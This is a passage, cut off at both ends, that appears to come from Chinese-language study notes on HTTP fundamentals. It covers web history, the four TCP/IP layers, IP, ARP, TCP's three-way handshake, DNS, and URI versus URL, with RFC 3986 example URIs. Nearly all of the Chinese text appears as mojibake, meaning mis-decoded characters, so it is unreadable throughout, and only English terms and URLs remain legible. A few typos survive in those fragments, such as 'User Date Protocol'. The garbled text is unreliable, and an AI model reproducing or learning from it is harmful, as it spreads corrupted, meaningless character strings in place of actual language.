çš„å›¾åƒï¼Œåœ¨å›¾åƒæ–¹é¢å‡ºè‰²çš„è¡¨çŽ°ä½¿å®ƒè¿…é€Ÿåœ¨ä¸–ç•ŒèŒƒå›´å†…æµè¡Œå¼€æ¥ã€‚åŒå¹´ç§‹å¤©ï¼ŒMosaic çš„ Windows ç‰ˆå’Œ Macintosh ç‰ˆé¢ä¸–ã€‚ä½¿ç”¨ CGI æŠ€æœ¯çš„ NCSA Web æœåŠ¡å™¨ã€NCSA HTTPd 1.0 ä¹Ÿå·®ä¸å¤šæ˜¯åœ¨è¿™ä¸ªæ—¶æœŸå‡ºçŽ°çš„ã€‚ NCSA Mosaic bounce pagehttp://archive.ncsa.illinois.edu/mosaic.html The NCSA HTTPd Home Pageï¼ˆå­˜æ¡£ï¼‰http://web.archive.org/web/20090426182129/http://hoohoo.ncsa.illinois.edu/ï¼ˆåŽŸå€å·²å¤±æ•ˆï¼‰ 1994 å¹´ çš„ 12 æœˆï¼Œç½‘æ™¯é€šä¿¡å…¬å¸å‘å¸ƒäº† Netscape Navigator 1.0ï¼Œ1995å¹´å¾®è½¯å…¬å¸å‘å¸ƒ Internet Explorer 1.0 å’Œ 2.0ã€‚ ç´§éšå…¶åŽçš„æ˜¯çŽ°åœ¨å·²ç„¶æˆä¸º Web æœåŠ¡å™¨æ ‡å‡†ä¹‹ä¸€çš„ Apacheï¼Œå½“æ—¶å®ƒä»¥ Apache 0.2 çš„å§¿æ€å‡ºçŽ°åœ¨ä¸–äººçœ¼å‰ã€‚è€Œ HTML ä¹Ÿå‘å¸ƒäº† 2.0 ç‰ˆæœ¬ã€‚é‚£ä¸€å¹´ï¼ŒWeb æŠ€æœ¯çš„å‘å±•çªé£žçŒ›è¿›ã€‚Internet Explorer æµè§ˆå™¨çš„ç‰ˆæœ¬ä»Ž 6 å‡åˆ° 7 å‰åŽèŠ±è´¹äº† 5 å¹´æ—¶é—´ã€‚ä¹‹åŽæŽ¥è¿žä¸æ–­åœ°å‘å¸ƒäº† 8ã€9ã€10 ç‰ˆæœ¬ã€‚å¦å¤–ï¼ŒChromeã€Operaã€Safari ç­‰æµè§ˆå™¨ä¹Ÿçº·çº·æŠ¢å å¸‚åœºä»½é¢ã€‚ ç½‘ç»œåŸºç¡€ TCP/IPé€šå¸¸ä½¿ç”¨çš„ç½‘ç»œï¼ˆåŒ…æ‹¬äº’è”ç½‘ï¼‰æ˜¯åœ¨ TCP/IP åè®®æ—çš„åŸºç¡€ä¸Šè¿ä½œçš„ã€‚è€Œ HTTP å±žäºŽå®ƒå†…éƒ¨çš„ä¸€ä¸ªå­é›†ã€‚ TCP/IP åè®®æ—è®¡ç®—æœºä¸Žç½‘ç»œè®¾å¤‡è¦ç›¸äº’é€šä¿¡ï¼ŒåŒæ–¹å°±å¿…é¡»åŸºäºŽç›¸åŒçš„æ–¹æ³•ã€‚æ¯”å¦‚ï¼Œå¦‚ä½•æŽ¢æµ‹åˆ°é€šä¿¡ç›®æ ‡ã€ç”±å“ªä¸€è¾¹å…ˆå‘èµ·é€šä¿¡ã€ä½¿ç”¨å“ªç§è¯­è¨€è¿›è¡Œé€šä¿¡ã€æ€Žæ ·ç»“æŸé€šä¿¡ç­‰è§„åˆ™éƒ½éœ€è¦äº‹å…ˆç¡®å®šã€‚ä¸åŒçš„ç¡¬ä»¶ã€æ“ä½œç³»ç»Ÿä¹‹é—´çš„é€šä¿¡ï¼Œæ‰€æœ‰çš„è¿™ä¸€åˆ‡éƒ½éœ€è¦ä¸€ç§è§„åˆ™ã€‚è€Œæˆ‘ä»¬å°±æŠŠè¿™ç§è§„åˆ™ç§°ä¸ºåè®®ï¼ˆprotocolï¼‰ã€‚ å¸¸è§çš„åè®®æœ‰IEEE 802.3ã€FDD1ã€HTTPã€SNMPã€UDPã€DNSã€IPç­‰ç­‰ï¼Œç»Ÿç§°ä¸ºTCP/IPã€‚ TCP/IP çš„åˆ†å±‚ç®¡ç†TCP/IPåè®®æ—æœ€é‡è¦çš„ä¸€ç‚¹å°±æ˜¯åˆ†å±‚ã€‚TCP/IPåè®®æ—æŒ‰å±‚æ¬¡åˆ†åˆ«åˆ†ä¸ºä»¥ä¸‹4å±‚ï¼šåº”ç”¨å±‚ã€ä¼ è¾“å±‚ã€ç½‘ç»œå±‚å’Œæ•°æ®é“¾å±‚ã€‚ æŠŠTCP/IPå±‚æ¬¡åŒ–æ˜¯æœ‰å¥½å¤„ã€‚æ¯”å¦‚ï¼Œå¦‚æžœäº’è”ç½‘åªæœ‰ä¸€ä¸ªåè®®ç»Ÿç­¹ï¼ŒæŸä¸ªåœ°æ–¹éœ€è¦è®¾è®¡æ—¶ï¼Œå°±å¿…é¡»æŠŠæ‰€æœ‰éƒ¨åˆ†æ•´ä½“æ›¿æ¢æŽ‰ã€‚è€Œåˆ†å±‚ä¹‹åŽåªéœ€è¦æŠŠå˜åŒ–çš„å±‚æ›¿æ¢å°±å¥½äº†ã€‚æŠŠå„å±‚ä¹‹é—´çš„æŽ¥å£è§„èŒƒå¥½ä¹‹åŽï¼Œæ¯ä¸ªå±‚æ¬¡å†…éƒ¨çš„è®¾è®¡å°±èƒ½å¤Ÿè‡ªç”±æ”¹åŠ¨äº†ã€‚ å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå±‚æ¬¡åŒ–ä¹‹åŽï¼Œè®¾è®¡å°±å˜å¾—ç®€å•äº†ã€‚å¤„äºŽåº”ç”¨å±‚ä¸Šçš„åº”ç”¨å¯ä»¥è€ƒè™‘åˆ†æ´¾è‡ªå·±çš„ä»»åŠ¡ï¼Œè€Œä¸éœ€è¦å¼„æ¸…å¯¹æ–¹åœ¨åœ°çƒä¸Šå“ªä¸ªåœ°æ–¹ã€å¯¹æ–¹çš„ä¼ è¾“è·¯çº¿æ˜¯æ€Žä¹ˆæ ·çš„ã€æ˜¯å¦èƒ½å¤Ÿç¡®ä¿ä¼ è¾“é€è¾¾ç­‰é—®é¢˜ã€‚ TCP/IPåè®®æ—å„å±‚çš„ä½œç”¨å¦‚ä¸‹ã€‚ åº”ç”¨å±‚åº”ç”¨å±‚å†³å®šäº†å‘ç”¨æˆ·æä¾›åº”ç”¨æœåŠ¡é€šä¿¡çš„æ´»åŠ¨ TCP/IPåè®®æ—å†…é¢„å­˜äº†å„ç±»é€šç”¨çš„åº”ç”¨æœåŠ¡ã€‚æ¯”å¦‚ï¼ŒFTP(File Transfer Protocol,æ–‡ä»¶ä¼ è¾“åè®®)å’Œ DNS(Domain Name System,åŸŸåç³»ç»Ÿ)æœåŠ¡å°±æ˜¯å…¶ä¸­ä¸¤ç±»ã€‚ HTTPåè®®ä¹Ÿå¤„äºŽè¯¥å±‚ ä¼ è¾“å±‚ä¼ è¾“å±‚å¯¹ä¸Šåº”ç”¨å±‚ï¼Œæä¾›ç½‘ç»œè¿žæŽ¥ä¸­çš„ä¸¤å°è®¡ç®—æœºä¹‹é—´çš„æ•°æ®ä¼ è¾“ã€‚åœ¨ä¼ è¾“å±‚æœ‰ä¸¤ä¸ªæ€§è´¨ä¸åŒçš„åè®®ï¼šTCPï¼ˆTransmission Control Protocolï¼Œä¼ è¾“æŽ§åˆ¶åè®®ï¼‰å’ŒUDP(User Date Protocolï¼Œç”¨æˆ·æ•°æ®æŠ±åè®®) ç½‘ç»œå±‚ï¼ˆæœ‰åç½‘ç»œäº’è¿žå±‚ï¼‰ç½‘ç»œå±‚ç”¨æ¥å¤„ç†åœ¨ç½‘ç»œä¸ŠæµåŠ¨çš„æ•°æ®åŒ…ã€‚æ•°æ®åŒ…æ˜¯ç½‘ç»œä¼ è¾“çš„æœ€å°æ•°æ®å•ä½ã€‚è¯¥å±‚è§„å®šäº†é€šè¿‡æ€Žä¹ˆæ ·çš„è·¯å¾„ï¼ˆæ‰€è°“çš„ä¼ è¾“è·¯çº¿ï¼‰åˆ°è¾¾å¯¹æ–¹è®¡ç®—æœºï¼Œå¹¶æŠŠæ•°æ®åŒ…ä¼ ç»™å¯¹æ–¹ã€‚ ä¸Žå¯¹æ–¹è®¡ç®—æœºä¹‹é—´é€šè¿‡å¤šå°è®¡ç®—æœºæˆ–ç½‘ç»œè®¾å¤‡è¿›è¡Œä¼ è¾“æ—¶ï¼Œç½‘ç»œå±‚æ‰€èµ·çš„ä½œç”¨å°±æ˜¯åœ¨ä¼—å¤šçš„é€‰é¡¹å†…é€‰æ‹©ä¸€æ¡ä¼ è¾“è·¯çº¿ã€‚ é“¾è·¯å±‚ï¼ˆåˆåä¸ºæ•°æ®é“¾è·¯å±‚ï¼Œç½‘ç»œæŽ¥å£å±‚ï¼‰ç”¨æ¥å¤„ç†è¿žæŽ¥ç½‘ç»œçš„ç¡¬ä»¶éƒ¨åˆ†ã€‚åŒ…æ‹¬æŽ§åˆ¶æ“ä½œç³»ç»Ÿã€ç¡¬ä»¶çš„è®¾å¤‡é©±åŠ¨ã€NICï¼ˆNetwork Interface Cardï¼Œç½‘ç»œé€‚é…å™¨ï¼Œå³ç½‘å¡ï¼‰ï¼ŒåŠå…‰çº¤ç­‰æ— åŠ›å¯è§éƒ¨åˆ†ï¼ˆè¿˜åŒ…æ‹¬è¿žæŽ¥å™¨ç­‰ä¸€åˆ‡ä¼ è¾“åª’ä»‹ï¼‰ã€‚ç¡¬ä»¶ä¸Šçš„èŒƒç•´å‡åœ¨é“¾è·¯å±‚çš„ä½œç”¨èŒƒå›´ä¹‹å†…ã€‚ TCP/IP é€šä¿¡ä¼ è¾“æµ åˆ©ç”¨TCP/IPåè®®æ—è¿›è¡Œç½‘ç»œé€šä¿¡æ—¶ï¼Œä¼šé€šè¿‡é¡ºåºä¸Žå¯¹æ–¹è¿›è¡Œé€šä¿¡ã€‚å‘é€ç«¯ä»Žåº”ç”¨å±‚å¾€ä¸‹èµ°ã€‚æŽ¥æ”¶ç«¯åˆ™å¾€åº”ç”¨å±‚å¾€ä¸Šèµ°ã€‚æˆ‘ä»¬ç”¨HTTPä¸¾ä¾‹æ¥è¯´æ˜Žï¼Œé¦–å…ˆä½œä¸ºå‘é€ç«¯çš„å®¢æˆ·ç«¯åœ¨åº”ç”¨å±‚ï¼ˆHTTPåè®®ï¼‰å‘å‡ºä¸€ä¸ªæƒ³çœ‹æŸä¸ªWebé¡µé¢çš„HTTPè¯·æ±‚ã€‚ æŽ¥ç€ä¸ºäº†ä¼ è¾“çš„æ–¹ä¾¿ï¼Œåœ¨ä¼ è¾“å±‚ï¼ˆTCPåè®®ï¼‰æŠŠä»Žåº”ç”¨å±‚æ”¶åˆ°çš„æ•°æ®ï¼ˆHTTPè¯·æ±‚æŠ¥æ–‡ï¼‰è¿›è¡Œåˆ†å‰²ï¼Œå¹¶åœ¨å„ä¸ªæŠ¥æ–‡æ‰“ä¸Šæ ‡è®°åºå·åŠç«¯å£å·åŽè½¬å‘ç½‘ç»œå±‚ã€‚ åœ¨ç½‘ç»œå±‚ï¼ˆIPåè®®ï¼‰ï¼Œå¢žåŠ ä½œä¸ºé€šä¿¡ç›®çš„åœ°çš„MACåœ°å€åŽè½¬å‘ç»™é“¾è·¯å±‚ã€‚è¿™æ ·ä¸€æ¥ï¼Œå‘å¾€ç½‘ç»œçš„é€šä¿¡è¯·æ±‚å°±å‡†å¤‡é½å…¨äº†ã€‚ æŽ¥å—ç«¯çš„æœåŠ¡å™¨åœ¨é“¾è·¯å±‚æŽ¥å—åˆ°æ•°æ®ï¼ŒæŒ‰åºå¾€ä¸Šå±‚å‘é€ï¼Œä¸€ç›´åˆ°åº”ç”¨å±‚ã€‚å½“ä¼ è¾“åˆ°åº”ç”¨å±‚ï¼Œæ‰èƒ½ç®—çœŸæ­£æŽ¥å—åˆ°ç”±å®¢æˆ·ç®—å‘é€è¿‡æ¥çš„HTTPè¯·æ±‚ã€‚ å‘é€ç«¯åœ¨å±‚ä¸Žå±‚ä¹‹é—´ä¼ è¾“æ•°æ®æ—¶ï¼Œæ¯ç»è¿‡ä¸€å±‚æ—¶å¿…å®šä¼šè¢«æ‰“ä¸Šä¸€ä¸ªè¯¥å±‚æ‰€å±žçš„é¦–éƒ¨ä¿¡æ¯ã€‚åä¹‹ï¼ŒæŽ¥æ”¶ç«¯åœ¨å±‚ä¸Žå±‚ä¼ è¾“æ•°æ®æ—¶ï¼Œæ¯ç»è¿‡ä¸€å±‚æ—¶å°±ä¼šæŠŠå¯¹åº”çš„é¦–éƒ¨æ¶ˆåŽ»ã€‚ è¿™ç§æŠŠæ•°æ®æ¶ˆæ¯åŒ…è£…èµ·æ¥çš„åšæ³•ç§°ä¸ºå°è£…ï¼ˆencapsulateï¼‰ ä¸Ž HTTP å…³ç³»å¯†åˆ‡çš„åè®® : IPã€TCP å’Œ DNSè´Ÿè´£ä¼ è¾“çš„ IP åè®®æŒ‰å±‚æ¬¡åˆ†ï¼ŒIPï¼ˆInternet Protocolï¼‰ç½‘é™…åè®®ä½äºŽç½‘ç»œå±‚ã€‚ Internet Protocolè¿™ä¸ªåè¯å¯èƒ½å¬èµ·æ¥æœ‰ç‚¹å¤¸å¼ ï¼Œä½†äº‹å®žæ­£æ˜¯å¦‚æ­¤ï¼Œå› ä¸ºå‡ ä¹Žæ‰€æœ‰ä½¿ç”¨ç½‘ç»œçš„ç³»ç»Ÿéƒ½ä¼šç”¨åˆ°IPåè®®ã€‚TCP/IPåè®®æ—ä¸­çš„IPæŒ‡çš„å°±æ˜¯ç½‘é™…åè®®ï¼Œåè®®åç§°ä¸­å æ®äº†ä¸€åŠçš„ä½ç½®ï¼Œå…¶é‡è¦æ€§å¯è§ä¸€æ–‘ã€‚å¯èƒ½æœ‰äººä¼šæŠŠâ€œIPâ€å’Œâ€œIPåœ°å€â€æžæ··ï¼Œâ€œIPâ€å…¶å®žæ˜¯ä¸€ç§åè®®çš„åç§°ã€‚ IPåè®®çš„ä½œç”¨å°±æ˜¯æŠŠå„ç§æ•°æ®åŒ…ä¼ é€ç»™å¯¹æ–¹ã€‚è€Œè¦ä¿è¯ç¡®å®žä¼ é€åˆ°å¯¹æ–¹é‚£é‡Œï¼Œåˆ™éœ€è¦æ»¡è¶³å„ç§å„ç±»æ¡ä»¶ã€‚å…¶ä¸­ä¸¤ä¸ªé‡è¦çš„æ¡ä»¶å°±æ˜¯IPåœ°å€å’ŒMACåœ°å€ï¼ˆMedia Access Control Addressï¼‰ã€‚ IPåœ°å€æŒ‡æ˜Žäº†èŠ‚ç‚¹è¢«åˆ†é…åˆ°çš„åœ°å€ï¼ŒMACåœ°å€æ˜¯æŒ‡ç½‘å¡æ‰€å±žçš„å›ºå®šåœ°å€ã€‚IPåœ°å€å¯ä»¥å’ŒMACåœ°å€è¿›è¡Œé…å¯¹ã€‚IPåœ°å€å¯å˜æ¢ï¼Œä½†MAXåœ°å€åŸºæœ¬ä¸Šä¸ä¼šæ›´æ”¹ã€‚ ä½¿ç”¨ARPåè®®å‡­å€ŸMACåœ°å€è¿›è¡Œé€šä¿¡ IPé—´çš„é€šä¿¡ä¾èµ–MACåœ°å€ã€‚åœ¨ç½‘ç»œä¸Šï¼Œé€šä¿¡çš„åŒæ–¹åœ¨åŒä¸€ä¸ªå±€åŸŸç½‘ï¼ˆLANï¼‰å†…çš„æƒ…å†µæ˜¯å¾ˆå°‘è§çš„ï¼Œé€šå¸¸æ˜¯ç»è¿‡å¤šå°è®¡ç®—æœºå’Œç½‘ç»œè®¾å¤‡ä¸­è½¬æ‰èƒ½è¿žæŽ¥åˆ°å¯¹æ–¹ã€‚è€Œåœ¨è¿›è¡Œä¸­è½¬æ—¶ï¼Œä¼šåˆ©ç”¨ä¸‹ä¸€ç«™ä¸­è½¬è®¾å¤‡çš„MACåœ°å€æ¥æœç´¢ä¸‹ä¸€ä¸ªä¸­è½¬ç›®æ ‡ã€‚è¿™æ—¶ï¼Œä¼šé‡‡ç”¨ARPï¼ˆAddress Resolution Protocolï¼‰ã€‚ARPæ˜¯ä¸€ç§ç”¨ä»¥è§£æžåœ°å€çš„åè®®ï¼Œæ ¹æ®é€šä¿¡æ–¹çš„IPåœ°å€å°±å¯ä»¥åæŸ¥å‡ºå¯¹åº”çš„MACåœ°å€ã€‚ æ²¡æœ‰äººèƒ½å¤Ÿå…¨é¢æŽŒæ¡äº’è”ç½‘ä¸­çš„ä¼ è¾“çŠ¶å†µ åœ¨åˆ°è¾¾é€šä¿¡ç›®æ ‡å‰çš„ä¸­è½¬è¿‡ç¨‹ä¸­ï¼Œé‚£äº›è®¡ç®—æœºå’Œè·¯ç”±å™¨ç­‰ç½‘ç»œè®¾å¤‡åªèƒ½èŽ·æ‚‰å¾ˆç²—ç•¥çš„ä¼ è¾“è·¯çº¿ã€‚è¿™ç§æœºåˆ¶ç§°ä¸ºè·¯ç”±é€‰æ‹©(routing),æœ‰ç‚¹åƒå¿«é€’å…¬å¸çš„é€è´§è¿‡ç¨‹ã€‚æƒ³è¦å¯„å¿«é€’çš„äººï¼Œåªè¦å°†è‡ªå·±çš„è´§ç‰©é€åˆ°é›†æ•£ä¸­å¿ƒï¼Œå°±å¯ä»¥çŸ¥é“å¿«é€’å…¬å¸æ˜¯å¦è‚¯æ”¶ä»¶å‘è´§ï¼Œè¯¥å¿«é€’å…¬å¸çš„é›†æ•£ä¸­å¿ƒæ£€æµ‹è´§ç‰©çš„é€è¾¾åœ°å€ï¼Œæ˜Žç¡®ä¸‹ç«™è¯¥é€å¾€å“ªä¸ªåŒºåŸŸçš„é›†æ•£ä¸­å¿ƒã€‚æŽ¥ç€ï¼Œé‚£ä¸ªåŒºåŸŸçš„é›†æ•£ä¸­å¿ƒè‡ªä¼šåˆ¤æ–­æ˜¯å¦èƒ½é€åˆ°åœ°æ–¹çš„å®¶ä¸­ã€‚é€šè¿‡è¿™ä¸ªæ¯”å–»è¯´æ˜Žäº†ï¼Œæ— è®ºå“ªå°è®¡ç®—æœºã€å“ªå°ç½‘ç»œè®¾å¤‡ï¼Œå®ƒä»¬éƒ½æ— æ³•å…¨é¢æŽŒæ¡äº’è”ç½‘ä¸­çš„ç»†èŠ‚ã€‚ ç¡®ä¿å¯é æ€§çš„ TCP åè®®æŒ‰å±‚æ¬¡åˆ†ï¼ŒTCPä½äºŽä¼ è¾“å±‚ï¼Œæä¾›å¯é çš„å­—èŠ‚æµæœåŠ¡ã€‚ æ‰€è°“çš„å­—èŠ‚æµæœåŠ¡ï¼ˆByte Stream Serviceï¼‰æ˜¯æŒ‡ï¼Œä¸ºäº†æ–¹ä¾¿ä¼ è¾“ï¼Œå°†å¤§å—æ•°æ®åˆ†å‰²æˆä»¥æŠ¥æ–‡æ®µï¼ˆsegmentï¼‰ä¸ºå•ä½çš„æ•°æ®åŒ…è¿›è¡Œç®¡ç†ã€‚è€Œå¯é çš„ä¼ è¾“æœåŠ¡æ˜¯æŒ‡ï¼Œèƒ½å¤ŸæŠŠæ•°æ®å‡†ç¡®å¯é åœ°ä¼ ç»™å¯¹æ–¹ã€‚ä¸€è¨€è€Œè”½ä¹‹ï¼ŒTCPåè®®ä¸ºäº†æ›´å®¹æ˜“ä¼ è¾¾å¤§æ•°æ®æ‰æŠŠæ•°æ®åˆ†å‰²ï¼Œè€Œä¸”TCPåè®®èƒ½å¤Ÿç¡®è®¤æ•°æ®æœ€ç»ˆæ˜¯å¦é€è¾¾åˆ°å¯¹æ–¹ã€‚ ç¡®ä¿æ•°æ®èƒ½å¤Ÿåˆ°è¾¾ç›®æ ‡ ä¸ºäº†å‡†ç¡®æ— è¯¯åœ°å°†æ•°æ®é€è¾¾åˆ°ç›®æ ‡å¤„ï¼ŒTCPåè®®é‡‡ç”¨äº†ä¸‰æ¬¡æ¡æ‰‹ï¼ˆthree-way-handshakingï¼‰ç­–ç•¥ã€‚ç”¨TCPåè®®æŠŠæ•°æ®åŒ…é€å‡ºåŽ»åŽï¼ŒTCPä¸ä¼šä¼ é€åŽçš„æƒ…å†µç½®ä¹‹ä¸ç†ï¼Œå®ƒä¸€å®šå›žæƒ³å¯¹æ–¹ç¡®è®¤æ˜¯å¦æˆåŠŸé€è¾¾ã€‚ æ¡æ‰‹è¿‡ç¨‹ä¸­ä½¿ç”¨äº†TCPçš„æ ‡å¿—ï¼ˆflagï¼‰â€”â€”SYNï¼ˆsynchronizeï¼‰å’ŒACKï¼ˆacknowledgementï¼‰ã€‚ å‘é€ç«¯é¦–å…ˆå‘é€ä¸€ä¸ªå¸¦SYNæ ‡å¿—çš„æ•°æ®åŒ…ç»™å¯¹æ–¹ã€‚æŽ¥æ”¶ç«¯æ”¶åˆ°åŽï¼Œå›žä¼ ä¸€ä¸ªå¸¦æœ‰SYN/ACKæ ‡å¿—çš„æ•°æ®åŒ…ä»¥ç¤ºä¼ è¾¾ç¡®è®¤æ¶ˆæ¯ã€‚æœ€åŽï¼Œå‘é€ç«¯å†å›žä¼ ä¸€ä¸ªå¸¦ACKæ ‡å¿—çš„æ•°æ®åŒ…ï¼Œä»£è¡¨â€œæ¡æ‰‹â€ç»“æŸã€‚ è‹¥åœ¨æ¡æ‰‹çš„è¿‡ç¨‹ä¸­æŸä¸ªé˜¶æ®µèŽ«åä¸­æ–­ï¼ŒTCPåè®®ä¼šå†æ¬¡ä»¥ç›¸åŒé¡ºåºå‘é€ç›¸åŒçš„æ•°æ®åŒ… é™¤äº†ä¸Šè¿°ä¸‰ä¸ªæ¡æ‰‹ï¼ŒTCPåè®®è¿˜æœ‰å…¶ä»–å„ç§æ‰‹æ®µæ¥ä¿è¯é€šä¿¡çš„å¯é æ€§ è´Ÿè´£åŸŸåè§£æžçš„ DNS æœåŠ¡DNSï¼ˆDomain Name Systemï¼‰æœåŠ¡æ˜¯å’ŒHTTPåè®®ä¸€æ ·ä½äºŽåº”ç”¨å±‚çš„åè®®ã€‚å®ƒæä¾›åŸŸååˆ°IPåœ°å€ä¹‹é—´çš„è§£æžæœåŠ¡ã€‚ è®¡ç®—æœºå³å¯ä»¥è¢«èµ‹äºˆIPåœ°å€ï¼Œä¹Ÿå¯ä»¥è¢«èµ‹äºˆä¸»æœºåå’ŒåŸŸåï¼Œæ¯”å¦‚ http://laibh.top ç”¨æˆ·é€šå¸¸ä½¿ç”¨ä¸»æœºåæˆ–åŸŸåæ¥è®¿é—®å¯¹æ–¹çš„è®¡ç®—æœºï¼Œè€Œä¸æ˜¯ç›´æŽ¥é€šè¿‡IPåœ°å€æ¥è®¿é—®ã€‚å› ä¸ºä¸ŽIPåœ°å€çš„ä¸€ç»„çº¯æ•°å­—ç›¸æ¯”ï¼Œç”¨å­—æ¯é…åˆæ•°å­—çš„è¡¨ç¤ºå½¢å¼æ¥æŒ‡å®šè®¡ç®—æœºåæ›´ç¬¦åˆäººç±»çš„è®°å¿†ä¹ æƒ¯ã€‚ä½†è¦è®©è®¡ç®—æœºåŽ»ç†è§£åç§°ï¼Œç›¸å¯¹è€Œè¨€å°±å˜å¾—å›°éš¾ã€‚å› ä¸ºè®¡ç®—æœºæ›´æ“…é•¿å¤„ç†ä¸€é•¿ä¸²æ•°å­—ã€‚ ä¸ºäº†è§£å†³ä¸Šè¿°çš„é—®é¢˜ï¼ŒDNSæœåŠ¡åº”è¿è€Œç”Ÿã€‚DNSåè®®æä¾›é€šè¿‡åŸŸåæŸ¥æ‰¾IPåœ°å€ï¼Œæˆ–é€†å‘ä»ŽIPåœ°å€åæŸ¥åŸŸåçš„æœåŠ¡ã€‚ å„ç§åè®®ä¸Ž HTTP åè®®çš„å…³ç³»å­¦ä¹ äº†å’Œ HTTP åè®®å¯†ä¸å¯åˆ†çš„ TCP/IP åè®®æ—ä¸­çš„å„ç§åè®®åŽï¼Œæˆ‘ä»¬å†é€šè¿‡è¿™å¼ å›¾æ¥äº†è§£ä¸‹ IP åè®®ã€TCP åè®®å’Œ DNS æœåŠ¡åœ¨ä½¿ç”¨HTTP åè®®çš„é€šä¿¡è¿‡ç¨‹ä¸­å„è‡ªå‘æŒ¥äº†å“ªäº›ä½œç”¨ã€‚ URI å’Œ URLä¸ŽURIï¼ˆç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦ï¼‰ç›¸æ¯”ï¼Œæˆ‘ä»¬æ›´ç†Ÿæ‚‰URLï¼ˆUniform Resource Locator, ç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼‰ã€‚URLæ­£æ˜¯ä½¿ç”¨Webæµè§ˆå™¨ç­‰è®¿é—®Webéœ€è¦è¾“å…¥çš„ç½‘ç»œåœ°å€ã€‚ ç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦URI æ˜¯ Uniform Rescource Identifier çš„ç¼©å†™ã€‚RFC2396åˆ†åˆ«å¯¹è¿™ä¸‰ä¸ªå•è¯è¿›è¡Œäº†å¦‚ä¸‹å®šä¹‰ Uniformè§„å®šç»Ÿä¸€çš„æ ¼å¼å¯æ–¹ä¾¿å¤„ç†å¤šç§ä¸åŒç±»åž‹çš„èµ„æºï¼Œè€Œä¸ç”¨æ ¹æ®ä¸Šä¸‹æ–‡çŽ¯å¢ƒæ¥è¯†åˆ«èµ„æºæŒ‡å®šçš„è®¿é—®æ–¹å¼ã€‚å¦å¤–ï¼ŒåŠ å…¥æ–°å¢žçš„åè®®æ–¹æ¡ˆï¼ˆå¦‚http:æˆ–ftp:ï¼‰ä¹Ÿæ›´å®¹æ˜“ Resourceèµ„æºçš„å®šä¹‰æ˜¯â€œå¯ä»¥æ ‡è¯†çš„ä»»ä½•ä¸œè¥¿â€ã€‚é™¤äº†æ–‡æ¡£æ–‡ä»¶ã€å›¾åƒæˆ–æœåŠ¡ï¼ˆä¾‹å¦‚å½“å¤©çš„å¤©æ°”é¢„æŠ¥ï¼‰ç­‰èƒ½å¤ŸåŒºåˆ«äºŽå…¶ä»–ç±»åž‹çš„ï¼Œå…¨éƒ½å¯ä½œä¸ºèµ„æºã€‚å¦å¤–èµ„æºä¸ä»…æ˜¯å•ä¸€çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯å¤šæ•°çš„é›†åˆä½“ã€‚ Identifierè¡¨ç¤ºå¯ä»¥æ ‡å¿—çš„å¯¹è±¡ï¼Œä¹Ÿå¯ä»¥æˆä¸ºæ ‡è¯†ç¬¦ã€‚ ç»¼ä¸Šæ‰€è¿°ï¼ŒURIå°±æ˜¯ç”±æŸä¸ªåè®®æ–¹æ¡ˆè¡¨ç¤ºçš„èµ„æºçš„å®šä½æ ‡è¯†ç¬¦ã€‚åè®®æ–¹æ¡ˆæ˜¯æŒ‡è®¿é—®èµ„æºæ‰€ä½¿ç”¨çš„åè®®ç±»åž‹åç§°ã€‚ é‡‡ç”¨HTTPåè®®æ—¶ï¼Œåè®®æ–¹æ¡ˆå°±æ˜¯http.é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰ftpã€mailtoã€telnetã€fileç­‰ã€‚æ ‡å‡†çš„URIåè®®æ–¹æ¡ˆæœ‰30ç§å·¦å³ï¼Œç”±éš¶å±žäºŽå›½é™…äº’è”ç½‘èµ„æºç®¡ç†çš„éžè¥åˆ©ç¤¾å›¢ICANN(Internet Corporation for Assigned Names and Numbers,äº’åˆ©ç½‘åç§°ä¸Žæ•°å­—åœ°å€åˆ†é…æœºæž„)çš„IANAï¼ˆInternet Assigned Numbers Authority,äº’åˆ©ç½‘å·ç åˆ†é…å±€ï¼‰çš„ç®¡ç†é¢å¸ƒã€‚ URI ç”¨å­—ç¬¦ä¸²æ ‡è¯†æŸä¸€äº’è”ç½‘èµ„æºï¼Œè€Œ URL è¡¨ç¤ºèµ„æºçš„åœ°ç‚¹ï¼ˆäº’è”ç½‘ä¸Šæ‰€å¤„çš„ä½ç½®ï¼‰ã€‚å¯è§ URL æ˜¯ URI çš„å­é›†ã€‚â€œRFC3986ï¼šç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦ï¼ˆURIï¼‰é€šç”¨è¯­æ³•â€ä¸­åˆ—ä¸¾äº†å‡ ç§ URI ä¾‹å­ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ 12345678ftp://ftp.is.co.za/rfc/rfc1808.txthttp://www.ietf.org/rfc/rfc2396.txtldap://[2001:db8::7]/c=GB?objectClass?onemailto:John.Doe@example.comnews:comp.infosystems.www.servers.unixtel:+1-816-555-1212telnet://192.0.2.16:80/urn:oasis:names:specification:docbook:dtd:xml:4.1.2 åœ¨å……åˆ†ç†è§£çš„åŸºç¡€ä¸Šï¼Œä¹Ÿå¯ç”¨ URL æ›¿æ¢ URIã€‚ URI æ ¼å¼è¡¨ç¤ºæŒ‡å®šçš„URIï¼Œè¦ä½¿ç”¨æ¶µç›–å…¨éƒ¨å¿…è¦ä¿¡æ¯çš„å†³å®šURIã€ç»å¯¹URLä»¥åŠç›¸å¯¹URLã€‚ç›¸å¯¹URLï¼Œæ˜¯æŒ‡ä»Žæµè§ˆå™¨ä¸­åŸºæœ¬URIå¤„æŒ‡å®šçš„URLï¼Œå½¢å¦‚ /image/logo.gifã€‚è®©æˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹ç»å¯¹ URI çš„æ ¼å¼ã€‚ ä½¿ç”¨http:æˆ–http:ç­‰åè®®æ–¹æ¡ˆåèŽ·å–è®¿é—®èµ„æºæ—¶è¦æŒ‡å®šåè®®ç±»åž‹ã€‚ä¸è¦åŒºåˆ†å­—æ¯å¤§å°å†™ï¼Œæœ€åŽé™„ä¸€ä¸ªå†’å·ï¼ˆï¼šï¼‰. ä¹Ÿå¯ä»¥ä½¿ç”¨data:æˆ–javascript:è¿™ç±»æŒ‡å®šæ•°æ®æˆ–è„šæœ¬ç¨‹åºçš„æ–¹æ¡ˆåã€‚ ç™»å½•ä¿¡æ¯ï¼ˆè®¤è¯ï¼‰ æŒ‡å®šç”¨æˆ·åå’Œå¯†ç 